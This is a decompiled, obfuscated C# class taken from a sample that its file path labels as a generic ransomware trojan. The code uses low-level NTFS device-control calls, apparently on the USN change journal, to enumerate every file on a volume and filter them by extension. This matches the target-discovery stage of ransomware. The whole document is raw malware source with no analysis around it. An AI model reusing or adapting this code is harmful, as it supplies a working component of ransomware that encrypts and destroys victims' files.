// Decompiled with JetBrains decompiler
// Type: ueLJGJbeRFZOq.NsgdkUCziu
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0EDCE10-9F20-42C9-8790-E70D370F9841
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.Win32.Generic-9bf0633f41d2962ba5e2895ece2ef9fa7b546ada311ca30f330f0d261a7fb184.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace ueLJGJbeRFZOq
{
  public sealed class NsgdkUCziu
  {
    [NonSerialized]
    internal static GetString \u0014;

    public void EEHCdCakbQjF(
      string hgDGDkYkjPxg,
      HashSet<string> AYWwIobXUr,
      out Dictionary<ulong, MfCRkKvYSremtJ> KpMrJJxXNDaN,
      out Dictionary<ulong, MfCRkKvYSremtJ> LHFacPkCtVx)
    {
      LHFacPkCtVx = new Dictionary<ulong, MfCRkKvYSremtJ>();
      KpMrJJxXNDaN = new Dictionary<ulong, MfCRkKvYSremtJ>();
      IntPtr zero = IntPtr.Zero;
      IntPtr QeqxIrJKYazBiWD = IntPtr.Zero;
      try
      {
        this.MIkJcnpGhaaFPl(hgDGDkYkjPxg, LHFacPkCtVx);
        this.PctFqtlZXD(hgDGDkYkjPxg, out QeqxIrJKYazBiWD);
        this.spfHEkhaWJJSVJOI(QeqxIrJKYazBiWD);
        this.nJtVOoWAITMF(ref zero, QeqxIrJKYazBiWD);
        this.RntStiSqmh(zero, ref KpMrJJxXNDaN, AYWwIobXUr, LHFacPkCtVx, QeqxIrJKYazBiWD);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message, (object) ex);
        for (Exception innerException = ex.InnerException; innerException != null; innerException = innerException.InnerException)
          Console.WriteLine(innerException.Message, (object) innerException);
        throw new ApplicationException(NsgdkUCziu.\u0014(107376210), ex);
      }
      finally
      {
        if (QeqxIrJKYazBiWD.ToInt32() != -1)
          WqWLCwhgVVpOo.nSHiwOduGOtpQC(QeqxIrJKYazBiWD);
        if (zero != IntPtr.Zero)
          Marshal.FreeHGlobal(zero);
      }
    }

    private void MIkJcnpGhaaFPl([In] string obj0, [In] Dictionary<ulong, MfCRkKvYSremtJ> obj1)
    {
      string str = NsgdkUCziu.\u0014(107376173) + obj0 + (object) Path.DirectorySeparatorChar;
      IntPtr num = WqWLCwhgVVpOo.ZKdeYhmtUT(str, 0U, 3U, IntPtr.Zero, 3U, 33554432U, IntPtr.Zero);
      if (num.ToInt32() == -1)
        return;
      WqWLCwhgVVpOo.PjOUVNuODLfT mesiyiZTHaRy = new WqWLCwhgVVpOo.PjOUVNuODLfT();
      if (WqWLCwhgVVpOo.ISGrjjKeRkN(num, out mesiyiZTHaRy))
      {
        ulong key = (ulong) mesiyiZTHaRy.yDnvSwgntGPEaK << 32 | (ulong) mesiyiZTHaRy.dtmLXAGsXRi;
        MfCRkKvYSremtJ mfCrkKvYsremtJ = new MfCRkKvYSremtJ(str, 0UL);
        obj1.Add(key, mfCrkKvYsremtJ);
      }
      WqWLCwhgVVpOo.nSHiwOduGOtpQC(num);
    }

    private void PctFqtlZXD(string aJqOLgvCBqpAH, out IntPtr QeqxIrJKYazBiWD)
    {
      string str = NsgdkUCziu.\u0014(107376173) + aJqOLgvCBqpAH;
      QeqxIrJKYazBiWD = WqWLCwhgVVpOo.ZKdeYhmtUT(str, 3221225472U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
    }

    private void RntStiSqmh(
      [In] IntPtr obj0,
      [In] ref Dictionary<ulong, MfCRkKvYSremtJ> obj1,
      [In] HashSet<string> obj2,
      [In] Dictionary<ulong, MfCRkKvYSremtJ> obj3,
      [In] IntPtr obj4)
    {
      IntPtr num1 = Marshal.AllocHGlobal(65544);
      WqWLCwhgVVpOo.USntSRNuggxzh(num1, 65544);
      uint iFVpKFREszgD = 0;
      while (WqWLCwhgVVpOo.rfBplVJZwsva(obj4, 590003U, obj0, sizeof (WqWLCwhgVVpOo.qwEkaoxqNF), num1, 65544, out iFVpKFREszgD, IntPtr.Zero))
      {
        IntPtr num2 = new IntPtr(num1.ToInt32() + 8);
        WqWLCwhgVVpOo.eNboiyhhmS eNboiyhhmS;
        for (; iFVpKFREszgD > 60U; iFVpKFREszgD -= eNboiyhhmS.CGEMYdjwcpW)
        {
          eNboiyhhmS = new WqWLCwhgVVpOo.eNboiyhhmS(num2);
          if (((int) eNboiyhhmS.pRJwNEEsxxBQp & 16) != 0)
          {
            if (obj3.ContainsKey(eNboiyhhmS.paGJyJHPss))
              throw new Exception(string.Format(NsgdkUCziu.\u0014(107376132), (object) eNboiyhhmS.paGJyJHPss, (object) eNboiyhhmS.cVvbQKOMBtmy));
            obj3.Add(eNboiyhhmS.paGJyJHPss, new MfCRkKvYSremtJ(eNboiyhhmS.cVvbQKOMBtmy, eNboiyhhmS.ZlLAPbqaSopJRqx));
          }
          else
          {
            bool flag = true;
            if (obj2 != null)
            {
              string extension = Path.GetExtension(eNboiyhhmS.cVvbQKOMBtmy);
              flag = obj2.Contains(extension);
            }
            if (flag)
            {
              if (!obj1.ContainsKey(eNboiyhhmS.paGJyJHPss))
              {
                obj1.Add(eNboiyhhmS.paGJyJHPss, new MfCRkKvYSremtJ(eNboiyhhmS.cVvbQKOMBtmy, eNboiyhhmS.ZlLAPbqaSopJRqx));
              }
              else
              {
                MfCRkKvYSremtJ mfCrkKvYsremtJ = obj1[eNboiyhhmS.paGJyJHPss];
                if (string.Compare(eNboiyhhmS.cVvbQKOMBtmy, mfCrkKvYsremtJ.get_Name(), true) != 0)
                {
                  Console.WriteLine(NsgdkUCziu.\u0014(107375583), (object) eNboiyhhmS.paGJyJHPss, (object) eNboiyhhmS.cVvbQKOMBtmy, (object) mfCrkKvYsremtJ.get_Name());
                  throw new Exception(string.Format(NsgdkUCziu.\u0014(107376132), (object) eNboiyhhmS.paGJyJHPss, (object) eNboiyhhmS.cVvbQKOMBtmy));
                }
              }
            }
          }
          num2 = new IntPtr((long) num2.ToInt32() + (long) eNboiyhhmS.CGEMYdjwcpW);
        }
        Marshal.WriteInt64(obj0, Marshal.ReadInt64(num1, 0));
      }
      Marshal.FreeHGlobal(num1);
    }

    private void spfHEkhaWJJSVJOI([In] IntPtr obj0)
    {
      ulong num1 = 8388608;
      ulong num2 = 1048576;
      WqWLCwhgVVpOo.UUriaFpDXmsjyJp structure;
      structure.izyvdzDqNmJF = num1;
      structure.obShgGzdVtwl = num2;
      int num3 = Marshal.SizeOf<WqWLCwhgVVpOo.UUriaFpDXmsjyJp>(structure);
      IntPtr num4 = Marshal.AllocHGlobal(num3);
      WqWLCwhgVVpOo.USntSRNuggxzh(num4, num3);
      Marshal.StructureToPtr<WqWLCwhgVVpOo.UUriaFpDXmsjyJp>(structure, num4, true);
      WqWLCwhgVVpOo.rfBplVJZwsva(obj0, 590055U, num4, num3, IntPtr.Zero, 0, out uint _, IntPtr.Zero);
    }

    private void nJtVOoWAITMF([In] ref IntPtr obj0, [In] IntPtr obj1)
    {
      uint pexGFuoBKwN = 0;
      WqWLCwhgVVpOo.VNSaMNqrqNH KookIWvWyEXm = new WqWLCwhgVVpOo.VNSaMNqrqNH();
      if (!WqWLCwhgVVpOo.AinynvKvOt(obj1, 590068U, IntPtr.Zero, 0, out KookIWvWyEXm, sizeof (WqWLCwhgVVpOo.VNSaMNqrqNH), out pexGFuoBKwN, IntPtr.Zero))
        return;
      WqWLCwhgVVpOo.qwEkaoxqNF structure;
      structure.UsgUrLfqrdyc = 0UL;
      structure.ZPtgqrlsLkzi = 0L;
      structure.NuvdBPJfIxMn = KookIWvWyEXm.uDdDTmcuzAYC;
      int cb = Marshal.SizeOf<WqWLCwhgVVpOo.qwEkaoxqNF>(structure);
      obj0 = Marshal.AllocHGlobal(cb);
      WqWLCwhgVVpOo.USntSRNuggxzh(obj0, cb);
      Marshal.StructureToPtr<WqWLCwhgVVpOo.qwEkaoxqNF>(structure, obj0, true);
    }

    static NsgdkUCziu() => Strings.CreateGetStringDelegate(typeof (NsgdkUCziu));
  }
}
